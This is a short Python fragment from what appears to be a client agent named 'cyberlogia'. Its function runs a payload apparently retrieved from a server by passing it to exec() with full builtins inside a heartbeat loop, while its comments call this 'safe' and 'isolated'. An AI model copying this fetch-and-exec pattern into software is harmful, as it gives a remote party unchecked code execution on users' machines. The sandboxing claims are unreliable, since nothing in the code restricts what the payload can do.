# Phase 3 - Safe execution
# --------------------------------------------------------------------------
def execute_payload(script_code):
    """Run the retrieved payload in an isolated namespace.

    Errors are reported but never terminate the heartbeat loop.
    """
    banner("Phase 3 - Safe Execution")
    namespace = {
        "__name__": "__cyberlogia_agent__",
        "__builtins__": __builtins__,
        "SERVICE_ID": SERVICE_ID,
        "SERVICE_TITLE": SERVICE_TITLE,
        "BASE_URL": BASE_URL,
    }
    try:
        exec(compile(script_code, "<cyberlogia-payload>", "exec"), namespace)
        log(TAG_OK, "Payload execution finished successfully.")
        return True
    except SystemExit as exc:
        log(TAG_WARN, "Payload requested exit (code %s)." % exc.code)
    except KeyboardInterrupt:
        raise
    except Exception as exc:
        log(TAG_ERR, "Payload raised %s: %s" % (type(exc).__name__, exc))
        traceback.print_exc()
    return False


